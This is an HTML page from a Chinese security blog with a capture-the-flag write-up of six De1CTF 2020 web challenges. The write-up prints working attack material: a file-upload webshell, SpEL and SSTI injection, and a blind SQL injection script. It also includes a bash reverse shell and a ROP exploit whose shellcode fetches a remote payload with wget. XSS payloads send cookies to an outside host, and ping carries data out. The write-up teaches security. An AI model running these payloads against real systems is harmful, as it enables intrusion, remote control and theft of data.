@@ -1,0 +1,553 @@
+<!DOCTYPE html><html lang="zh-Hans" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>2020 De1CTF Web | Tyaoo's Blog</title><meta name="keywords" content="CTF"><meta name="author" content="Tyaoo"><meta name="copyright" content="Tyaoo"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="de1ta 师傅出的题质量真的太高了，膜拜一下">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2020 De1CTF Web">
+<meta property="og:url" content="https://tyaoo.github.io/2020/05/13/2020-De1CTF-Web/index.html">
+<meta property="og:site_name" content="Tyaoo&#39;s Blog">
+<meta property="og:description" content="de1ta 师傅出的题质量真的太高了，膜拜一下">
+<meta property="og:locale">
+<meta property="og:image" content="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7">
+<meta property="article:published_time" content="2020-05-13T12:43:17.000Z">
+<meta property="article:modified_time" content="2020-05-13T12:47:17.545Z">
+<meta property="article:author" content="Tyaoo">
+<meta property="article:tag" content="CTF">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://tyaoo.github.io/2020/05/13/2020-De1CTF-Web/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"search.xml","languages":{"hits_empty":"We didn't find any results for the search: ${query}"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: undefined,
+  copy: {
+    success: 'Copy successfully',
+    error: 'Copy error',
+    noSupport: 'The browser does not support'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: 'Just',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '2020 De1CTF Web',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2020-05-13 20:47:17'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><link rel="stylesheet" href="/css/custom.css"><meta name="generator" content="Hexo 6.0.0"><link rel="alternate" href="/atom.xml" title="Tyaoo's Blog" type="application/atom+xml">
+</head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/avatar.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data is-center"><div class="data-item"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">35</div></a></div><div class="data-item"><a href="/tags/"><div class="headline">Tags</div><div class="length-num">11</div></a></div><div class="data-item"><a href="/categories/"><div class="headline">Categories</div><div class="length-num">0</div></a></div></div><hr/></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Tyaoo's Blog</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> Search</span></a></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">2020 De1CTF Web</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2020-05-13T12:43:17.000Z" title="Created 2020-05-13 20:43:17">2020-05-13</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2020-05-13T12:47:17.545Z" title="Updated 2020-05-13 20:47:17">2020-05-13</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="2020 De1CTF Web"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post View:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p>de1ta 师傅出的题质量真的太高了，膜拜一下</p>
+<span id="more"></span>
+
+<h2 id="checkin"><a href="#checkin" class="headerlink" title="checkin"></a>checkin</h2><p>文件上传题目</p>
+<p>先上传 .htaccess，php 字段使用反斜杠绕过</p>
+<pre><code>AddType application/x-httpd-p\
+hp .png</code></pre><p>然后上传后缀为 .png 的一句话木马访问即可</p>
+<pre><code>&lt;?= system(&#39;cat /flag&#39;);</code></pre><h2 id="calc"><a href="#calc" class="headerlink" title="calc"></a>calc</h2><p>java 计算器题目</p>
+<blockquote>
+<p>这题是环境坏了捡了个漏</p>
+</blockquote>
+<p>抓包修改 <code>clac</code>，添加一些图书字符使其报错，发现是 springboot 框架</p>
+<p>可以知道是 SpEL 表达式注入</p>
+<p>fuzz 之后过滤了以下关键字</p>
+<pre><code>- T\s*\(
+- \#
+- new
+- java\.lang
+- Runtime
+- exec.*\(
+- getRuntime
+- ProcessBuilder
+- start
+- getClass
+- String</code></pre><p>payload 可以结合 java  的反射机制和字符串拼接可以绕过黑名单</p>
+<pre><code>&quot;&quot;.class.forName(&quot;java.l&quot;+&quot;ang.Ru&quot;+&quot;ntime&quot;).getDeclaredMethods()[15].invoke\
+(&quot;&quot;.class.forName(&quot;java.l&quot;+&quot;ang.Ru&quot;+&quot;ntime&quot;).getDeclaredMethods()[7].invoke(null),&quot;whoami&quot;)</code></pre><p>但是可以执行命令之后发现还有一个 openrasp 的 waf</p>
+<p>当时没什么头绪，但是发现下午的时候它的 openrasp 崩了 ：）</p>
+<p>于是就可以执行命令了，参考下面文章在 java 反弹 shell 然后 cat /flag 就好了</p>
+<p><a target="_blank" rel="noopener" href="https://blog.spoock.com/2018/11/25/getshell-bypass-exec/">https://blog.spoock.com/2018/11/25/getshell-bypass-exec/</a></p>
+<pre><code>/bin/bash -c bash$&#123;IFS&#125;-i$&#123;IFS&#125;&gt;&amp;/dev/tcp/xxx.xxx.xxx.xxx/9999&lt;&amp;1</code></pre><p>复现的时候才知道，有 waf 的情况下可以直接读文件</p>
+<pre><code>&quot;&quot;.class.forName(&quot;java.nio.ByteBuffer&quot;).wrap(&quot;&quot;.class.forName(&quot;java.nio.file.Files&quot;).readAllBytes(&quot;&quot;.class.forName(&quot;java.nio.file.Paths&quot;).get(&quot;/flag&quot;))).get(&#123;&#125;)</code></pre><h2 id="mixture"><a href="#mixture" class="headerlink" title="mixture"></a>mixture</h2><p>limit 注入 + .so 拓展逆向题目</p>
+<h3 id="limit-注入"><a href="#limit-注入" class="headerlink" title="limit 注入"></a>limit 注入</h3><p>打开 member.php 有一个 orderby 提示</p>
+<p><img src="https://i.loli.net/2020/05/11/O9s7LmWvQ5ilr4J.png" alt="image-20200511105951203.png"></p>
+<p>fuzz 了很久页面还是毫无变化，黑名单是以下关键字</p>
+<pre><code>-  if
+- regexp
+- sleep
+- union
+- desc
+- rand
+- extractvalue
+- updatexml 
+- ^
+- ||
+- &amp;&amp;</code></pre><p>过了很久才测出下面 payload 页面有变化</p>
+<pre><code>member.php?orderby=limit%201</code></pre><p>这题就和 2019GoogleCTF 的 gLotto 差不多</p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/5503#toc-1">https://xz.aliyun.com/t/5503#toc-1</a></p>
+<pre><code>orderby=is+not+null,+(case+when+(ascii(mid(database(),1,1))=116)+then+(select+benchmark(5000000,sha(1))+from+users+limit+1)+else+null+end)</code></pre><p>利用脚本进行盲注得到密码</p>
+<pre><code class="python">import requests as req
+import time
+url = &quot;http://49.51.251.99/&quot;
+sess = req.Session()
+
+def login():
+    sess.get(url)
+    data = &#123;
+        &quot;username&quot;: &quot;admin1&quot;,
+        &quot;password&quot;: &quot;admin1&quot;,
+        &quot;submit&quot;: &quot;submit&quot;
+    &#125;
+    sess.post(f&quot;&#123;url&#125;index.php&quot;, data=data)
+    # print(sess.get(f&quot;&#123;url&#125;member.php&quot;).text)
+
+def sqli():
+    flag = &#39;&#39;
+    index = 1
+
+    while(1):
+
+        l = 0
+        r = 127
+        m = (l+r)//2
+
+        while l&lt;r:
+            paramsGet = &#123;&quot;orderby&quot;:&quot;is not null, (case when (ascii(mid(((select password from member where id=1)),&#123;&#125;,1))&gt;&#123;&#125;) then (select benchmark(1000000,sha(1)) from users limit 1) else null end)&quot;.format(index, m)&#125;
+            # first req to get cache
+            res = sess.get(&quot;http://49.51.251.99/member.php&quot;, params=paramsGet)
+            # print(paramsGet)
+            try:
+                # time blind sqli
+                res = sess.get(&quot;http://49.51.251.99/member.php&quot;, params=paramsGet, timeout=1)
+                r = m
+            except Exception as e:
+                l = m + 1
+            finally:
+                m = (l+r)//2
+        flag += chr(m)
+        index += 1
+        print(f&quot;[*]flag: &#123;flag&#125;&quot;)
+
+if __name__ == &quot;__main__&quot;:
+    login()
+    sqli()</code></pre>
+<p><img src="https://i.loli.net/2020/05/11/QEqgo65FJKrpjRe.png" alt="image-20200511110704496.png"></p>
+<h3 id="so-拓展逆向"><a href="#so-拓展逆向" class="headerlink" title=".so 拓展逆向"></a>.so 拓展逆向</h3><p>进去之后是一个读文件接口和 phpinfo 页面</p>
+<p>搜索一到一个 <code>Minclude</code> 扩展，然后根据拓展地址下载下来</p>
+<p><img src="https://i.loli.net/2020/05/11/Nk3yDbRYH7xSrmc.png" alt="image-20200511110831912.png"></p>
+<p>后面就交给 @q4n 爷爷去 rop 了，附上队友的脚本</p>
+<pre><code class="python">import requests
+from pwn import *
+sess = requests.Session()
+url = &quot;http://49.51.251.99/&quot;
+# auto renew session
+def remote_login():
+    data = &#123;
+        &quot;username&quot;: &quot;admin&quot;,
+        &#39;password&#39;: &quot;goodlucktoyou&quot;,
+        &#39;submit&#39;: &quot;submit&quot;
+    &#125;
+    sess.post(url, data=data)
+
+
+# connect remote
+def remote1(filename):
+    remote_login()
+    data = &#123;&quot;submit&quot;:&quot;submit&quot;,&quot;search&quot;:filename&#125;
+    response = sess.post(url + &quot;select.php&quot;, data=data).content
+    # index = response.rfind(&quot;&lt;br&gt;&quot;.encode())
+    text = response
+    print(text)
+    # download(filename, text)
+
+
+
+
+# download file
+def download(filename, text):
+    filename = filename[filename.rfind(&quot;/&quot;) + 1:]
+    print(&quot;[+] write %s&quot; %(filename))
+    f = open(filename, &quot;wb&quot;)
+    f.write(text)
+    f.close()
+
+
+# test in local docker
+def local(filename):
+    url = &quot;http://ip:8085/&quot;
+    data = &#123;
+        &quot;search&quot;: filename
+    &#125;
+    resp = requests.post(url, data=data).content
+    print(resp)
+    # return resp
+context.arch=&quot;amd64&quot;
+libc = None
+stack = None
+
+
+def genpayload():
+    global DEB
+    # srv
+    if DEB:
+        libc = 0x00007f77c0d7c000
+        stack = 0x00007ffc81aa4000
+    else:
+        libc = 0x7f2fb414d000
+        stack = 0x7ffc338fa000
+
+
+    system = 0x00449C0+libc
+    pdi=0x0000000000023a5f+libc
+    psi=0x000000000002440e+libc
+    pdx=0x0000000000106725+libc
+    pcx=0x00000000000e898e+libc
+    pbx=0x000000000002d0d9+libc
+    print(hex(pbx))
+    xa=0x0000000000098385+libc
+    one = libc+0x4484f
+    mprotect = libc+0x0F4200
+    ret = 0x000000000002235f+libc
+    # 0x0000000000106724 : pop r10 ; ret
+    p10 = 0x0000000000106724+libc
+    # 0x00000000000351d4 : add rdi, r10 ; jmp rdi
+    jdi = 0x00000000000351d4 + libc
+    # 0x0000000000106723 : pop rdx ; pop r10 ; ret
+    pdxp=0x0000000000106723+libc
+
+
+    # 0x000000000003a2b2 : mov rdi, r9 ; call rdx
+    pr = 0x000000000003a2b2+libc
+    getsp = 0x00000000000a35c6+libc # : lea ecx, dword ptr [rax + 1] ; lea r9, qword ptr [rsp + 0x28] ; call rbx
+
+
+    payload = &#39;a&#39;.ljust(0x88,&#39;\x00&#39;) #padding
+
+
+    payload += flat(pdi,stack)
+    payload += flat(psi,0x21000)
+    payload += flat(pdx,7)
+    payload += p64(mprotect)
+
+
+    payload += flat(pbx,pbx)
+    payload += p64(getsp)
+    payload += flat(pdxp,jdi)
+    payload += p64(0xdeadbeef)
+    payload += flat(pdxp,jdi)
+    payload += p64(0x30) #r10
+    payload += p64(pr)
+    payload += &#39;\x90&#39;*0x28
+    # shellcode place
+    code64=&quot;&quot;&quot;
+sub rsp,0x200
+xor rax,rax
+xor     rsi,    rsi            
+push rsi
+
+
+call here
+.string &quot;/bin/sh&quot;
+.byte 0
+here:
+pop rdi
+
+
+call here2
+.string &quot;/tmp/verver&quot;
+.byte 0
+here2:
+pop rdx
+
+
+call here3
+.string &quot;/usr/bin/wget&quot;
+.byte 0
+here3:
+pop r8
+
+
+call here4
+.string &quot;http://ip:2333/&quot;
+.byte 0
+here4:
+pop r9
+
+
+call here6
+.string &quot;-O&quot;
+.byte 0
+here6:
+pop rsi
+
+
+call here5
+.string &quot;/tmp/verver&quot;
+.byte 0
+here5:
+pop rbx
+
+
+push 0
+push rdx
+push rdi
+
+
+push rsp
+pop rsi
+
+
+xor rdx,rdx
+mov al,0x3b
+syscall
+cmp rax, 0
+jnz ex
+loop:
+nop
+jmp loop
+ex:
+int 3
+&quot;&quot;&quot;
+    payload += asm(code64)
+    return payload
+
+
+DEB = 0
+if __name__ == &quot;__main__&quot;:
+    if DEB:
+        local(genpayload())
+    else:
+        remote1(genpayload())</code></pre>
+<p>反弹 shell 后上去动态 /readflag 前抓一下时钟计算就好了</p>
+<pre><code>trap &#39;&#39; 14</code></pre><h2 id="Hard-pentest1"><a href="#Hard-pentest1" class="headerlink" title="Hard_pentest1"></a>Hard_pentest1</h2><p>无字母 shell + 渗透题目</p>
+<h3 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h3><p>一开始文件上传，后缀可以用大小写绕过 <code>pHp</code></p>
+<p>字符限制可以用 <code>$_</code>自增绕过</p>
+<p>附上队友的脚本</p>
+<pre><code class="python">res = []
+# get a and _
+prefix =&#39;&#39;&#39;
+$_=[];
+$_=@&quot;$_&quot;;
+$_=$_[&#39;!&#39;==&#39;@&#39;];
+$___=$_;
+$__=&#39;_&#39;;
+&#39;&#39;&#39;.split()
+res.extend(prefix)
+# get _GET
+GET = &quot;GET&quot;
+for i in GET:
+    for time in range(ord(i) - ord(&quot;A&quot;)):
+        res.append(&quot;$_++;&quot;)
+    res.append(&quot;$__.=$_;&quot;)
+    res.append(&quot;$_=$___;&quot;)
+# ($_GET[_])($_GET[__],$_GET[___]);
+res.append(&quot;($&#123;$__&#125;[_])($&#123;$__&#125;[__],$&#123;$__&#125;[___]);&quot;)
+with open(&quot;shell.php&quot;, &quot;w&quot;) as f:
+    for i in res:
+        f.write(f&quot;&lt;?= &#123;i.strip()[:-1]&#125; ?&gt;&quot;)
+        f.write(&quot;\n&quot;)
+    f.close()</code></pre>
+<p>然后就可以使用 <code>file_put_contents</code> 进行写马了</p>
+<h3 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h3><p>具体用到的是一个组策略 gpp 的漏洞</p>
+<blockquote>
+<p>主要参考月亮大哥的思路</p>
+</blockquote>
+<p><code>netstat -ano</code>查看一下网络信息发现有一台<code>192.168.0.12</code>的主机</p>
+<p><code>net user /domain</code>查看域发现有一个<code>HintZip_Pass</code>用户</p>
+<p><img src="https://i.loli.net/2020/05/11/stGrgkidj2FlZHf.png" alt="image-20200511112144407.png"></p>
+<p><code>net user HintZip_Pass /domain</code>继续查看该账户</p>
+<p><img src="https://i.loli.net/2020/05/11/D3WNgCV4cXaJLqO.png" alt="image-20200511112304043.png"></p>
+<p>查看域控信息</p>
+<p><img src="https://i.loli.net/2020/05/11/tdEDUC9jaX6IFnQ.png" alt="image-20200511112406373.png"></p>
+<p>挂载查看 <code>Hint</code> 信息</p>
+<pre><code>net use e: \\192.168.0.12\Hint
+cd /d e:</code></pre><p><img src="https://i.loli.net/2020/05/11/8I9bB3m1kaZRcrz.png" alt="image-20200511112525140.png"></p>
+<p>发现一个加密压缩包</p>
+<p>挂载再查看 <code>SYSVOL</code> 信息</p>
+<pre><code>net use e: \\192.168.0.12\SYSVOL
+cd /d e:</code></pre><p>使用<code>tree</code>查看目录结构</p>
+<p><img src="https://i.loli.net/2020/05/11/HnZM3e1DvR2tP9B.png" alt="image-20200511112734995.png"></p>
+<p>这个<code>Groups</code>文件夹, 有GPP漏洞</p>
+<p><img src="https://i.loli.net/2020/05/11/iWKsY2InFlRGBN7.png" alt="image-20200511112822374.png"></p>
+<p>使用 kali 的 <code>gpp-decrypt</code> 工具解密即可拿到解压密码</p>
+<h2 id="mc-logclient"><a href="#mc-logclient" class="headerlink" title="mc_logclient"></a>mc_logclient</h2><p>SSTI 题目</p>
+<p>简单说一下题目逻辑就是写文件和读文件前都需要校验 <code>work</code> 这个是可以简单爆破的，先读文件才能进行写文件（这个不重要），读文件可以出发 SSTI 漏洞</p>
+<pre><code class="python">def get_work(text, result):
+    chrset = string.ascii_letters + string.digits
+    for c1 in chrset:
+        for c2 in chrset:
+            for c3 in chrset:
+                for c4 in chrset:
+                    s4 = c1 + c2 + c3 + c4
+                    tmp_result = hashlib.sha256((text + s4).encode()).hexdigest()
+                    if tmp_result == result:
+                        print(f&quot;[*] right work: &#123;s4&#125;&quot;)
+                        return s4</code></pre>
+<p>SSTI 的黑名单如下，问题不大，可以用 request 绕过</p>
+<pre><code># Some bad words.
+blacklist = [&#39;+&#39;, &#39;,&#39;, &#39;:&#39;, &#39;\&#39;\&#39;&#39;, &#39;&quot;&quot;&#39;, &#39;%&#39;, &#39;lower&#39;, &#39;upper&#39;, &#39;builtin&#39;, &#39;fork&#39;, &#39;exec&#39;, &#39;walk&#39;, &#39;open&#39;, &#39;spawn&#39;, &#39;reload&#39;, &#39;exit&#39;, &#39;bin&#39;, &#39;sh&#39;, &#39;cat&#39;, &#39;config&#39;, &#39;secret&#39;, &#39;key&#39;, &#39;flag&#39;]
+
+# Posix is a bad module, filter it all.
+for i in dir(posix):
+    blacklist.append(i.lower())</code></pre><blockquote>
+<p>这里过滤的是 ‘’ 而不是 ‘ 当时被坑了</p>
+</blockquote>
+<p>给出一个简单的 payload</p>
+<pre><code>&#123;&#123;().__class__.__bases__[0].__subclasses__()[132].__init__.__globals__['system'](request.args.b)&#125;&#125;</code></pre><p>虽然是可以命令执行了，但是当时什么外带命令都打不出来，赛后发现是可以用 ping 进行外带数据</p>
+<p>客户端执行</p>
+<pre><code>ping -c 1 -p `/readflag` [your vps]</code></pre><p>vps 执行</p>
+<pre><code>tcpdump -c 2 -q -XX -vvv -nn -i eth0 icmp</code></pre><p>就可以监听到 flag 数据了，但是 icmp 包最大只能接收84长度的数据包，所有要打多几次</p>
+<p>官方 wp 利用新特性 <code>breakpointhook</code> 的方法</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/impakho/de1ctf-mc_challs/tree/master/writeup/mc_logclient">https://github.com/impakho/de1ctf-mc_challs/tree/master/writeup/mc_logclient</a></p>
+<h2 id="Animal-Crossing"><a href="#Animal-Crossing" class="headerlink" title="Animal Crossing"></a>Animal Crossing</h2><p>XSS 题目</p>
+<p>一进来是个好看的动森界面</p>
+<p><img src="https://i.loli.net/2020/05/11/rFSQIdENuq4mRoa.png" alt="image.png"></p>
+<p>经过 fuzz 可以发现 name、fruit 和 username 处有转义，title 处有 waf，显然注入点就在 title，但是直接加了单引号被 waf 了，而且 \x 编码绕不过就迷茫了，后来才发现不是单引号被 waf 了，是报错被 waf 了 ：）</p>
+<p>title 可以直接单引号注释逃逸</p>
+<pre><code>titile=1&#39;//</code></pre><p>看看 CSP，支持内联标签</p>
+<pre><code>Content-Security-Policy: default-src &#39;self&#39; &#39;unsafe-inline&#39; &#39;unsafe-eval&#39;;object-src &#39;none&#39;;</code></pre><p>黑名单绕过就使用 base64 编码</p>
+<pre><code>1&#39;+open(atob(&#39;payload&#39;))</code></pre><p>以下 payload 可以弹回 cookie，cookie 弹回来就是前一半的 flag</p>
+<pre><code>(function test()&#123;window.location=&quot;http://ip:9999/?f=&quot;+btoa(document.cookie);&#125;()));//</code></pre><p>然后读一下网页源码可以看到有 400 张图片</p>
+<pre><code>(function test()&#123;window.location=&quot;http://ip:9999/?f=&quot;+btoa(document.body.innerHTML);&#125;()));//</code></pre><p>利用 upload 接口把照片带到外面</p>
+<pre><code>(async()=&gt;&#123;
+    const arr = []
+    for(let i=1;i&lt;=400;i++) &#123;
+    res = await fetch(`/island/test_$&#123;String(i).padStart(2,0)&#125;.png`)
+    data = await res.blob()
+    const os = new FormData();
+    const mf = new File([data], &quot;name.png&quot;);
+    os.append(&quot;file&quot;, mf);
+    r = await fetch(&quot;/upload&quot;, &#123;method: &quot;POST&quot;,body: os&#125;)
+    data = await r.json()
+    arr.push(data.data)
+    &#125;
+    location=&quot;http://xxx.xxx.xxx.xxx:9999/?f=&quot;+btoa(JSON.stringify(arr))
+&#125;)();</code></pre><p>下载图片然后拼图得到后半部分的 flag</p>
+<pre><code class="python">def main(width_len, height_len, result):
+
+    img = Image.open(&quot;img//01.png&quot;)
+    size = img.size
+    width, height = size[0], size[1]
+    print(f&quot;width: &#123;width&#125;, height: &#123;height&#125;&quot;)
+
+    width_len, height_len = int(width_len), int(height_len)
+    width_length, height_length = width_len, height_len
+    sum_width, sum_height = width * width_length, height * height_length
+
+    joint = Image.new(&#39;RGB&#39;, (sum_width, sum_height))
+    index = 0
+    for row in range(height_length):
+        for col in range(width_length):
+            joint.paste(Image.open(&quot;img//&quot; + str(index) + &quot;.png&quot;), (col * width, row * height))
+            index += 1
+
+    joint.save(result)
+    Image.open(result).show() </code></pre>
+<p><img src="https://i.loli.net/2020/05/11/1LopmHTJ8Gb5cxQ.png" alt="image-20200511120509584.png"></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="mailto:undefined">Tyaoo</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="https://tyaoo.github.io/2020/05/13/2020-De1CTF-Web/">https://tyaoo.github.io/2020/05/13/2020-De1CTF-Web/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/CTF/">CTF</a></div><div class="post_share"><div class="social-share" data-image="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2020/05/13/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E2%80%94%E2%80%94Kerberos%E7%AF%87/"><img class="prev-cover" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">Previous Post</div><div class="prev_info">内网渗透——Kerberos篇</div></div></a></div><div class="next-post pull-right"><a href="/2020/03/25/Drozer-%E5%85%A5%E9%97%A8/"><img class="next-cover" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">Next Post</div><div class="next_info">Drozer 入门</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Tyaoo</div><div class="author-info__description"></div></div><div class="card-info-data is-center"><div class="card-info-data-item"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">35</div></a></div><div class="card-info-data-item"><a href="/tags/"><div class="headline">Tags</div><div class="length-num">11</div></a></div><div class="card-info-data-item"><a href="/categories/"><div class="headline">Categories</div><div class="length-num">0</div></a></div></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/Tyaoo"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Catalog</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#checkin"><span class="toc-number">1.</span> <span class="toc-text">checkin</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#calc"><span class="toc-number">2.</span> <span class="toc-text">calc</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#mixture"><span class="toc-number">3.</span> <span class="toc-text">mixture</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#limit-%E6%B3%A8%E5%85%A5"><span class="toc-number">3.1.</span> <span class="toc-text">limit 注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#so-%E6%8B%93%E5%B1%95%E9%80%86%E5%90%91"><span class="toc-number">3.2.</span> <span class="toc-text">.so 拓展逆向</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Hard-pentest1"><span class="toc-number">4.</span> <span class="toc-text">Hard_pentest1</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="toc-number">4.1.</span> <span class="toc-text">文件上传</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B8%97%E9%80%8F"><span class="toc-number">4.2.</span> <span class="toc-text">渗透</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#mc-logclient"><span class="toc-number">5.</span> <span class="toc-text">mc_logclient</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Animal-Crossing"><span class="toc-number">6.</span> <span class="toc-text">Animal Crossing</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent 